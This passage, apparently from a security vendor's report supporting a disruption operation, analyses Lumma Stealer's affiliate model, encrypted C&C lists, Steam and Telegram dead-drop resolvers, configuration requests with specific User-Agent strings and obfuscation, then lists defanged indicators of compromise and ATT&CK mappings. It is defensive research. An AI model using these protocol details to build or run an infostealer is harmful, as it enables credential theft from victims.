exfiltration. Affiliates have access to a management panel with a user-friendly interface where they can download exfiltrated data and harvested credentials.\n\nThe tiered subscription model ranges from USD 250 to USD 1,000 per month, each with increasingly sophisticated features. Lower tiers include basic filtering and log download options, while higher tiers offer custom data collection, evasion tools, and early access to new features. The most expensive plan emphasizes stealth and adaptability, offering unique build generation and reduced detection.\n\nThe operators of Lumma Stealer have also created a Telegram marketplace with a rating system for affiliates to sell stolen data without intermediaries. The marketplace has been well documented in Cybereason research. Moreover, they maintain public documentation of the management panel for affiliates and periodically share updates and fixes on hacking forums, as shown in Figure 3.\n\nFigure 3. The official Lumma Stealer documentation – machine translated from Russian to English (May 12th, 2025)\n\nOpen documentation not only helps affiliates with less experience to use the malware service, but also provides valuable insights for security researchers. Developers focus on malware builds, data pipelining, and infrastructure maintenance, while affiliates are responsible for distributing the malware. This information, combined with the service’s popularity, results in a wide variety of compromise vectors.\n\nCommon distribution methods include phishing, cracked software, and other malware downloaders including SmokeLoader, DarkGate, Amadey, Vidar, and others. Popular phishing schemes involve ClickFix or fake CAPTCHA web pages, fraudulent forums with cracked software, fake GitHub repositories, fraudulent links on Reddit forums, and many more.\n\n## Technical analysis\n\nNumerous public analyses have already been written about Lumma Stealer and its compromise vectors. Our focus here, however, is on the aspects relevant to the disruption. In this section, we will briefly introduce the key static and dynamic properties that we have been actively extracting from Lumma Stealer.\n\n### Static properties of Lumma Stealer\n\nVarious information comes embedded in Lumma Stealer malware samples. This naturally presents an ideal target for automated extraction. Besides the obvious data of interest – C&amp;C server domains – the samples also contain identifier strings that tie the sample to a specific affiliate and a campaign, and an optional identifier leading to a custom dynamic configuration. These identifiers are used in network communication with the C&amp;C server during data exfiltration and requests for dynamic configuration. In the sections below, we look at these properties in depth.\n\n#### C&amp;C domains\n\nEach Lumma Stealer sample contains a list of nine encrypted C&amp;C domains. While the encryption methods have evolved over time, the characteristic array structure has remained consistent up to the time of writing.\n\nBased on Lumma Stealer’s internal sample versioning, which is heavily protected by stack string obfuscation, we know that up until January 2025, the C&amp;C domains in the samples were protected by an XOR function and base64 encoding (see Figure 4). When the base64-encoded string was decoded, it revealed a structure where the first 32 bytes served as an XOR key, and the remaining bytes contained the encrypted C&amp;C domain.\n\nFigure 4. List of XOR-protected and base64-encoded C&amp;C domains\n\nIn January 2025, Lumma Stealer transitioned the protection of the C&amp;C list to ChaCha20 encryption with a single hardcoded key and nonce (see Figure 5). This protection of the C&amp;C list in the Lumma Stealer binaries has remained the same up until the time of publication.\n\nFigure 5. ChaCha20-protected C&amp;C domains\n\n#### Dead-drop resolvers\n\nSince June 2024, each Lumma Stealer build came with a new feature for obtaining a backup C&amp;C. If no C&amp;C server from the static config responds to Lumma Stealer, then the backup C&amp;C is extracted from a dummy Steam profile web page acting as a dead-drop resolver. The Steam profile URL is heavily protected in the binary, the same way as the version string. The encrypted backup C&amp;C URL is set in the Steam profile name, as shown in Figure 6, and the protection is a simple Caesar cipher (ROT11).\n\nFigure 6. Steam profile and Telegram channel used as dead-drop resolvers\n\nIn February 2025, Lumma Stealer received an update that included a feature for obtaining a new, primary C&amp;C URL from a Telegram channel dead-drop resolver. The C&amp;C URL is extracted from the Telegram channel’s title field, and it is protected by the same algorithm as in the case of the Steam profile dead-drop resolver. The main difference in the usage of the Telegram and Steam profile dead-drop resolvers is that the Telegram option is tested first, while the Steam profile is used as a last resort if successful communication has not been established with previously obtained C&amp;C servers (Figure 16).\n\nMoreover, we believe that the Telegram dead-drop resolver is available for higher tier subscriptions. This is because many samples do not have the Telegram URL set, and therefore the malware skips this method.\n\n#### Lumma Stealer identifier\n\nEach Lumma Stealer sample contains a unique hardcoded affiliate identifier known as LID. It is embedded in plaintext form and utilized for communication with C&amp;C servers. Up until March 2025, the LID parameter string followed a structured format, delimited by two dashes (Figure 7). A detailed analysis of the LID affiliate string is provided in an upcoming section.\n\nFigure 7. LID identifier in Lumma Stealer sample\n\nAlthough the most prevalent LID observed during our tracking begins with the string uz4s1o; the second most common LID, which starts with LPnhqo, provides a better example for visualizing typical LID variability. In the word cloud in Figure 8, we present the top 200 LIDs collected during our tracking, starting with LPnhqo.\n\nFigure 8. List of the top 200 LID identifiers beginning with the LPnhqo prefix seen in our telemetry\n\nHowever, in early March 2025, Lumma Stealer transitioned to using hexadecimal identifiers, referred to internally as UID (see Figure 9).\n\nFigure 9. Comparison of HTTPS POST requests for a dynamic configuration\n\n#### Optional configuration identifier\n\nIn addition to the LID parameter, Lumma Stealer samples may also contain an optional parameter referred to internally as J. When present, this parameter is in cleartext and formatted as a 32-byte ASCII hex string (see Figure 10). The J parameter is utilized in the C&amp;C request for dynamic configuration with additional definitions for exfiltration. We talk about dynamic configuration in more detail in a following section.\n\nFigure 10. The J parameter in a Lumma Stealer sample\n\nIf the J parameter is missing in the Lumma Stealer sample, an empty string is used in the C&amp;C request and a default configuration is retrieved. Unlike LID, the J parameter is rarely present in Lumma Stealer samples. However, it plays a crucial role when present, as it enables retrieving a dynamic configuration that significantly increases the stealer’s capabilities, making it a more versatile exfiltration tool for threat actors.\n\nIn March 2025, when the LID parameter was renamed to UID and its format changed, the J parameter was renamed to CID but with no change to its format or function.\n\n### Analysis of static properties\n\nFrom our long-term tracking and statistical analysis of LID parameters, we believe that the first segment of the LID identifies the affiliate, while the second segment differentiates between campaigns. Based on this assumption you can see the top 200 affiliate identifiers in Figure 11.\n\nFigure 11. The most frequently seen affiliate identifiers in our telemetry\n\nMoreover, we have been able to create a visualization of the affiliates’ activities over the past year (see Figure 12). This visualization highlights a week in January 2025. These types of visualizations have provided us with valuable insights into the patterns and behaviors of different threat actors. Additionally, the visualizations reveal a shared, domain-based C&amp;C infrastructure among most Lumma Stealer affiliates. At the same time, we were able to identify less frequently used C&amp;C domains, which we suspect have been reserved for higher tier affiliates or more important campaigns.\n\nFigure 12. Visualization of Lumma Stealer infrastructure utilization (early January 2025 time frame)\n\n### Dynamic properties of Lumma Stealer\n\nLumma Stealer retrieves a dynamic configuration from the C&amp;C server, which contains definitions specifying what to scan for exfiltration (see Table 1). The primary focus is on stealing web browser extension data and databases containing passwords, session cookies, web browsing history, and autofill data. Besides web browsers, it also focuses on stealing data from password managers, VPNs, FTP clients, cloud services, remote desktop applications, email clients, cryptocurrency wallets, and note-taking applications.\n\nTable 1. Dynamic config’s JSON fields\n\nKey\nDescription\n\n\n\n\nv\nDynamic config version.\n\n\nse\nOption for taking a screenshot of the victim’s machine for exfiltration.\n\n\nex\nList of Chromium-based browser extensions to target for exfiltration.\nEach entry consists of:\n ·  The extension ID, stored as en.\n ·  The extension name, stored as ez.\n\n\nc\nDefinition of files targeted for exfiltration. \nThe most interesting entries are:\n ·  The path for file scanning, stored as p.\n ·  The file extension list filter for exfiltration, stored as m.\n ·  The maximum folder scanning depth, stored as d.\n ·  The maximum file size for exfiltration, stored as fs.\n\nEven though we haven’t seen significant changes in the default configurations, this feature enhances the malware’s ability to perform targeted exfiltration (see Figure 13). A comprehensive overview of the configuration fields has already been well documented in this research by SpyCloud.\n\nFigure 13. Example of a dynamic config\n\nThe configuration is in JSON format, and it is downloaded from the C&amp;C server using an HTTPS POST request that includes the LID identifier, optional J parameter, and a specific hardcoded User-Agent string.\n\nThe protection of the dynamic configuration has changed a few times recently. Formerly, it was protected in the same way as the static C&amp;C list, by a 32-byte XOR function and base64 encoding. In March 2025 the protection changed to ChaCha20, where the key and nonce were prepended to the encrypted configuration.\n\nThe User-Agent string is important to follow, as providing it correctly is essential for receiving the dynamic configuration. In April 2025, Lumma Stealer introduced an additional layer of obfuscation by encrypting JSON values using an 8-byte XOR function (see Figure 14).\n\nFigure 14. Dynamic configuration with encryption of some values\n\nThis encrypted variant of the dynamic configuration is delivered when a slightly updated User-Agent string is specified (see Table 2).\n\nTable 2. User-Agent variants\n\nUser-Agent\nDescription\n\n\n\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\nOld User-Agent string resulting in a dynamic configuration variant shown in Figure 13.\n\n\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nNew User-Agent string resulting in a dynamic configuration variant with encryption of some values (Figure 14).\n\nBesides this dynamic configuration approach, Lumma Stealer samples still contain hardcoded instructions for exfiltrating files. These include data from applications such as Outlook or Thunderbird, Steam account information, and Discord account tokens (see this SpyCloud blogpost). This combination of dynamic and hardcoded configurations ensures that Lumma Stealer can effectively collect a wide range of valuable data.\n\nTo summarize all the static and dynamic changes mentioned so far, we have created a timeline (Figure 15) highlighting the most significant developments observed in the Lumma Stealer malware over the past year.\n\nFigure 15. Timeline of the most significant updates over the past year\n\n### C&amp;C communication\n\nThroughout our Lumma Stealer tracking period, all extracted C&amp;C domains consistently led to Cloudflare services, which are utilized to conceal Lumma Stealer’s real C&amp;C infrastructure. Cloudflare services are also employed for C&amp;C servers located via dead-drop resolvers.\n\nFirst, Lumma Stealer needs to obtain an active C&amp;C server. The mechanism of this choice is illustrated in the flow chart shown in Figure 16.\n\nFigure 16. C&amp;C selection mechanism\n\n#### Handshake\n\nAlthough the actual handshake request to the C&amp;C server is not present in the latest Lumma Stealer builds, it is worth mentioning because it was a feature of our tracking for a long time. The handshake request was an HTTPS POST request containing act=live and a hardcoded User-Agent. Active servers responded with a cleartext ok message.\n\n#### Configuration request\n\nWhen Lumma Stealer identifies an active C&amp;C server, it requests the configuration via an HTTPS POST request (Figure 17), which includes the LID and J parameters as data. If the J parameter is not present in the sample, Lumma Stealer retrieves the default configuration from the C&amp;C server. This configuration specifies what to scan for exfiltration, allowing the malware to adapt to different targets and environments.\n\n#### Additional payload execution\n\nAfter Lumma Stealer successfully exfiltrates sensitive data and harvested credentials, it issues one final HTTPS POST request to the C&amp;C server – this time, with an additional victim hardware ID called hwid. This final request retrieves a configuration of an additional payload to be executed on the victim’s machine. The payload or a URL to download from is part of that configuration. Note that such a payload is not always provided.\n\nFigure 17. Lumma Stealer C&amp;C communication flow\n\n### Anti-analysis obfuscation techniques\n\nLumma Stealer employs a few, but effective, anti-emulation techniques to make analysis as complicated as possible. These techniques are designed to evade detection and hinder the efforts of security analysts.\n\n#### Indirect jump obfuscation\n\nOne of the primary obfuscation techniques used by Lumma Stealer is indirect control flow flattening, shown in Figure 18. This method effectively disrupts the code blocks of the functions, making it nearly impossible to keep track of the function logic. By flattening the control flow, the malware obfuscates its operations, complicating the analysis process. For a detailed exploration of this technique and thorough analysis of these obfuscation patterns, along with an outline of the solution, you can refer to this comprehensive article by Mandiant.\n\nFigure 18. Indirect control flow obfuscation\n\n#### Stack strings\n\nAnother technique employed by Lumma Stealer is the use of encrypted stack strings, as illustrated in Figure 19. This method effectively hides binary data and many important strings in the Lumma Stealer sample, making static analysis of the binary difficult. Moreover, each encrypted string has its own unique mathematical function for decryption, adding another layer of complexity to the analysis process.\n\nFigure 19. Stack string decryption routine\n\n#### Import API obfuscation\n\nIn Lumma Stealer, imports are resolved at runtime. Import names are hashed using the FNV-1a algorithm with each build using a custom offset basis. As shown in Figure 20, since August 25th, 2024, Lumma Stealer also obfuscates the FNV hash algorithm parameters by using stack strings.\n\nFigure 20. Stack string obfuscation of hash parameters used for obfuscating imported API names\n\n## Conclusion\n\nThis global disruption operation was made possible by our long-term tracking of Lumma Stealer, which we have provided an overview of in this blogpost. We have described the modus operandi of the Lumma Stealer group and its service. Additionally, we have documented the important static identifiers and C&amp;C communication as well as its evolution over the last year. Finally, we summarized the key obfuscation techniques that make the analysis of Lumma Stealer challenging.\n\nThe disruption operation, led by Microsoft, aims to seize all known Lumma Stealer C&amp;C domains, rendering Lumma Stealer’s exfiltration infrastructure nonfunctional. ESET will continue to track other infostealers while closely monitoring for Lumma Stealer activity following this disruption operation.\n\n## IoCs\n\n### SHA-1\nFilename\nDetection\nDescription\n\n\n\n\n6F94CFAABB19491F2B8E719D74AD032D4BEB3F29\nAcroRd32.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-06-27.\n\n\nC5D3278284666863D7587F1B31B06F407C592AC4\nNotion.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-07-14.\n\n\n5FA1EDC42ABB42D54D98FEE0D282DA453E200E99\nexplorer.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-08-08.\n\n\n0D744811CF41606DEB41596119EC7615FFEB0355\naspnet\\_regiis.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-08-25.\n\n\n2E3D4C2A7C68DE2DD31A8E0043D9CF7E7E20FDE1\nnslookup.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-09-20.\n\n\n09734D99A278B3CF59FE82E96EE3019067AF2AC5\nnslookup.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-10-04.\n\n\n1435D389C72A5855A5D6655D6299B4D7E78A0127\nBitLockerToGo.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-11-09.\n\n\n2CCCEA9E1990D6BC7755CE5C3B9B0E4C9A8F0B59\nexternal.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2024-12-23.\n\n\n658550E697D9499DB7821CBBBF59FFD39EB59053\nWemod-Premium-Unlocker-2025\nMSIL/GenKryptik.HGWU\nLumma Stealer sample – Build 2025-01-18.\n\n\n070A001AC12139CC1238017D795A2B43AC52770D\nkhykuQw.exe\nWin32/Kryptik.HYUC\nLumma Stealer sample – Build 2025-02-27.\n\n\n1FD806B1A0425340704F435CBF916B748801A387\nStart.exe\nWin64/Injector.WR\nLumma Stealer sample – Build 2025-03-24.\n\n\nF4840C887CAAFF0D5E073600AEC7C96099E32030\nloader.exe\nWin64/Kryptik.FAZ\nLumma Stealer sample – Build 2025-04-15.\n\n\n8F58C4A16717176DFE3CD531C7E41BEF8CDF6CFE\nSet-up.exe\nWin32/Spy.Lumma Stealer.B\nLumma Stealer sample – Build 2025-04-23.\n\n### Network\n\nIP\nDomain\nHosting provider\nFirst seen\nDetails\n\n\n\n\n172.67.134[.]100\ncooperatvassquaidmew[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n172.67.175[.]165\ncrisisrottenyjs[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]1\ndeadtrainingactioniw[.]xyz\ntamedgeesy[.]sbs\nnighetwhisper[.]top\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n172.67.141[.]43\nexuberanttjdkwo[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]3\ngrandcommonyktsju[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n104.21.92[.]96\nqualificationjdwko[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n172.67.209[.]200\nsweetcalcutangkdow[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n104.21.49[.]80\nwordingnatturedowo[.]xyz\nCloudflare, Inc.\n2024‑06‑27\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]0\nbigmouthudiop[.]shop\nfroytnewqowv[.]shop\nlocatedblsoqp[.]shop\nstagedchheiqwo[.]shop\nCloudflare, Inc.\n2024‑07‑16\nLumma Stealer C&amp;C server.\n\n\n104.21.19[.]156\ncallosallsaospz[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.153[.]40\nindexterityszcoxp[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.192[.]52\nlariatedzugspd[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.213[.]85\nliernessfornicsa[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.137[.]78\noutpointsozp[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.221[.]214\nshepherdlyopzc[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.204[.]158\nunseaffarignsk[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n172.67.178[.]194\nupknittsoappz[.]shop\nCloudflare, Inc.\n2024‑07‑18\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]3\nbassizcellskz[.]shop\nbyteplusx[.]digital\nsparkiob[.]digital\nlongitudde[.]digital\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.47[.]141\ncelebratioopz[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n172.67.158[.]159\ncomplaintsipzzx[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n172.67.204[.]20\ndeallerospfosu[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.35[.]48\nlanguagedscie[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.73[.]43\nmennyudosirso[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]9\nquialitsuzoxm[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n172.67.166[.]231\nwriterospzm[.]shop\nCloudflare, Inc.\n2024‑08‑07\nLumma Stealer C&amp;C server.\n\n\n104.21.16[.]180\ncaffegclasiqwp[.]shop\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n172.67.146[.]35\ncondedqpwqm[.]shop\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\nN/A\nevoliutwoqm[.]shop\nN/A\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]0\nmillyscroqwp[.]shop\nstamppreewntnq[.]shop\nadvennture[.]top\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n104.21.67[.]155\ntraineiwnqo[.]shop\nCloudflare, Inc.\n2024‑08‑24\nLumma Stealer C&amp;C server.\n\n\n94.140.14[.]33\nachievenmtynwjq[.]shop\ncarrtychaintnyw[.]shop\nchickerkuso[.]shop\nmetallygaricwo[.]shop\nmilldymarskwom[.]shop\nopponnentduei[.]shop\npuredoffustow[.]shop\nquotamkdsdqo[.]shop\nbemuzzeki[.]sbs\nexemplarou[.]sbs\nexilepolsiy[.]sbs\nfrizzettei[.]sbs\ninvinjurhey[.]sbs\nisoplethui[.]sbs\nladdyirekyi[.]sbs\nwickedneatr[.]sbs\nCloudflare, Inc.\n2024‑09‑21\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]4\nusseorganizedw[.]shop\nbellflamre[.]click\ntripfflux[.]world\nCloudflare, Inc.\n2024‑09‑24\nLumma Stealer C&amp;C server.\n\n\n104.21.44[.]84\nbeerishint[.]sbs\nCloudflare, Inc.\n2024‑10‑06\nLumma Stealer C&amp;C server.\n\n\n104.21.64[.]84\n1212tank.activitydmy[.]icu\nCloudflare, Inc.\n2024‑11‑12\nLumma Stealer C&amp;C server.\n\n\n104.21.93[.]246\nbrownieyuz[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.189[.]210\nducksringjk[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.146[.]64\nexplainvees[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.90[.]226\nrelalingj[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.14[.]17\nrepostebhu[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.192[.]43\nrottieud[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]1\nthinkyyokej[.]sbs\nCloudflare, Inc.\n2024‑11‑08\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]7\nbashfulacid[.]lat\ntentabatte[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n104.21.86[.]54\ncurverpluch[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n104.21.66[.]86\nlev‑tolstoi[.]com\nCloudflare, Inc.\n2024‑12‑17\nLumma Stealer C&amp;C server.\n\n\n172.64.80[.]1\nmanyrestro[.]lat\ntoppyneedus[.]biz\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n188.114.97[.]2\nshapestickyr[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n172.67.192[.]247\nslipperyloo[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n104.105.90[.]131\nsteamcommunity[.]com\nsteamcommunity[.]com\nAkamai Technologies, Inc.\n2024‑06‑27\nSteam profile dead‑drop resolvers.\n\n\n172.67.146[.]68\ntalkynicer[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\n172.67.184[.]241\nwordyfindy[.]lat\nCloudflare, Inc.\n2024‑12‑23\nLumma Stealer C&amp;C server.\n\n\nN/A\nbeevasyeip[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nbroadecatez[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nencirelk[.]cyou\nN/A\n2025‑01‑28\nLumma Stealer C&amp;C server.\n\n\nN/A\ngranystearr[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nquarrelepek[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\nrockemineu[.]bond\nN/A\n2025‑01‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.19[.]91\nsuggestyuoz[.]biz\nCloudflare, Inc.\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\nN/A\ntranuqlekper[.]bond\nN/A\n2025‑01‑22\nLumma Stealer C&amp;C server.\n\n\n104.21.69[.]194\ncodxefusion[.]top\nCloudflare, Inc.\n2025‑02‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.80[.]1\nearthsymphzony[.]today\nclimatologfy[.]top\nCloudflare, Inc.\n2025‑02‑26\nLumma Stealer C&amp;C server.\n\n\n104.21.88[.]16\nexperimentalideas[.]today\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n172.67.146[.]181\ngadgethgfub[.]icu\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n104.21.48[.]238\nhardrwarehaven[.]run\nCloudflare, Inc.\n2025‑02‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.16[.]1\nhardswarehub[.]today\npixtreev[.]run\nCloudflare, Inc.\n2025‑02‑28\nLumma Stealer C&amp;C server.\n\n\n104.21.39[.]95\nquietswtreams[.]life\nCloudflare, Inc.\n2025‑02‑26\nLumma Stealer C&amp;C server.\n\n\n172.67.222[.]46\nsocialsscesforum[.]icu\nCloudflare, Inc.\n2025‑03‑03\nLumma Stealer C&amp;C server.\n\n\n172.67.191[.]187\ntechmindzs[.]live\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n172.67.214[.]226\ntechspherxe[.]top\nCloudflare, Inc.\n2025‑03‑01\nLumma Stealer C&amp;C server.\n\n\n104.21.26[.]124\nappgridn[.]live\nCloudflare, Inc.\n2025‑03‑24\nLumma Stealer C&amp;C server.\n\n\n172.67.178[.]7\nlunoxorn[.]top\nCloudflare, Inc.\n2025‑03‑31\nLumma Stealer C&amp;C server.\n\n\n104.21.47[.]117\nskynetxc[.]live\nCloudflare, Inc.\n2025‑03‑24\nLumma Stealer C&amp;C server.\n\n\n104.21.72[.]121\ntargett[.]top\nCloudflare, Inc.\n2025‑03‑20\nLumma Stealer C&amp;C server.\n\n\n188.114.96[.]2\ntravewlio[.]shop\nCloudflare, Inc.\n2025‑03‑20\nLumma Stealer C&amp;C server.\n\n\n104.21.42[.]7\nchangeaie[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.85[.]126\nclarmodq[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.161[.]40\nliftally[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.176[.]107\npiratetwrath[.]run\nCloudflare, Inc.\n2025‑04‑17\nLumma Stealer C&amp;C server.\n\n\n172.67.215[.]114\nquilltayle[.]live\nCloudflare, Inc.\n2025‑04‑17\nLumma Stealer C&amp;C server.\n\n\n172.67.143[.]12\nsalaccgfa[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n104.21.5[.]146\nstarofliught[.]top\nCloudflare, Inc.\n2025‑04‑17\nLumma Stealer C&amp;C server.\n\n\n104.21.32[.]1\nzestmodp[.]top\nCloudflare, Inc.\n2025‑04‑08\nLumma Stealer C&amp;C server.\n\n\n172.67.147[.]123\nequatorf[.]run\nCloudflare, Inc.\n2025‑04‑21\nLumma Stealer C&amp;C server.\n\n\n104.21.112[.]1\nhemispherexz[.]top\nCloudflare, Inc.\n2025‑04‑21\nLumma Stealer C&amp;C server.\n\n\n104.21.20[.]106\nlatitudert[.]live\nCloudflare, Inc.\n2025‑04‑21\nLumma Stealer C&amp;C server.\n\n\n172.67.216[.]12\nsectorecoo[.]live\nCloudflare, Inc.\n2025‑04‑19\nLumma Stealer C&amp;C server.\n\n## MITRE ATT&amp;CK techniques\n\nThis table was built using version 17 of the MITRE ATT&amp;CK framework.\n\nTactic\nID\nName\nDescription\n\n\n\n\nResource Development\nT1587.001\nDevelop Capabilities: Malware\nLumma Stealer operators actively developed their malware as a product for their service.\n\n\nT1583.001\nAcquire Infrastructure: Domains\nLumma Stealer operators registered domains for their exfiltration infrastructure.\n\n\nT1583.006\nAcquire Infrastructure: Web Services\nLumma Stealer operators used Cloudflare services to hide their infrastructure. Lumma Stealer also hid its C&amp;C URLs in public services like dummy Steam profiles or empty Telegram channels.\n\n\nExecution\nT1059.003\nCommand-Line Interface: Windows Command Shell\nLumma Stealer executes cmd.exe to delete temporary files.\n\n\nT1106\nNative API\nLumma Stealer executes a variety of Windows APIs, including VirtualAlloc, LoadLibraryA, and GetProcAddress.\n\n\nT1204.001\nUser Execution: Malicious Link\nLumma Stealer operators offer a simple LNK packing feature for their malware builds.\n\n\nT1047\nWindows Management Instrumentation\nLumma Stealer uses WMI queries to gather system information.\n\n\nDefense Evasion\nT1622\nDebugger Evasion\nLumma Stealer checks for debugger presence.\n\n\nT1140\nDeobfuscate/Decode Files or Information\nLumma Stealer uses ChaCha20 for C&amp;C list and dynamic config encryption.\n\n\nT1027.007\nObfuscated Files or Information: Dynamic API Resolution\nLumma Stealer resolves API names at runtime using the FNV-1a hash algorithm.\n\n\nT1027.013\nObfuscated Files or Information: Encrypted/Encoded File\nLumma Stealer encrypts strings and important binary data using stack strings or ChaCha20.\n\n\nCredential Access\nT1555.003\nCredentials from Password Stores: Credentials from Web Browsers\nLumma Stealer gathers credentials from multiple browsers.\n\n\nT1539\nSteal Web Session Cookie\nLumma Stealer gathers cookies from multiple browsers.\n\n\nDiscovery\nT1217\nBrowser Bookmark Discovery\nLumma Stealer checks and collects various information about installed browsers on victims’ machines.\n\n\nT1012\nQuery Registry\nLumma Stealer queries registry keys to list installed software on victims’ machines.\n\n\nT1057\nProcess Discovery\nLumma Stealer sends the process list to its C&amp;C server.\n\n\nT1518\nSoftware Discovery\nLumma Stealer sends a list of installed software to its C&amp;C server.\n\n\nT1082\nSystem Information Discovery\nLumma Stealer sends system information to its C&amp;C server.\n\n\nT1124\nSystem Time Discovery\nLumma Stealer sends the current system time and time zone to its C&amp;C server.\n\n\nCollection\nT1560\nArchive Collected Data\nLumma Stealer compresses gathered data before exfiltration to its C&amp;C server.\n\n\nT1119\nAutomated Collection\nLumma Stealer's exfiltration capabilities are fully automated and based on a configuration file.\n\n\nT1113\nScreen Capture\nLumma Stealer takes screenshots of victims’ machines based on dynamic configuration.\n\n\nT1005\nData from Local System\nLumma Stealer collects local system data from victims’ machines.\n\n\nCommand and Control\nT1071.001\nApplication Layer Protocol: Web Protocols\nLumma Stealer uses HTTPS communication with its C&amp;C servers.\n\n\nT1132.001\nData Encoding: Standard Encoding\nLumma Stealer used base64 encoding for obtaining its configuration from the C&amp;C server.\n\n\nT1573.001\nEncrypted Channel: Symmetric Cryptography\nLumma Stealer uses additional ChaCha20 encryption under the HTTPS network protocol.\n\n\nT1008\nFallback Channels\nLumma Stealer employs backup dead-drop resolvers in Steam profiles and Telegram channels.\n\n\nT1102.001\nWeb Service: Dead Drop Resolver\nLumma Stealer employs backup dead-drop resolvers in Steam profiles and Telegram channels.\n\n\nExfiltration\nT1020\nAutomated Exfiltration\nLumma Stealer exfiltrates stolen credentials and data over the C&amp;C channel.\n\n\nT1041\nExfiltration Over C2 Channel\nLumma Stealer exfiltrates 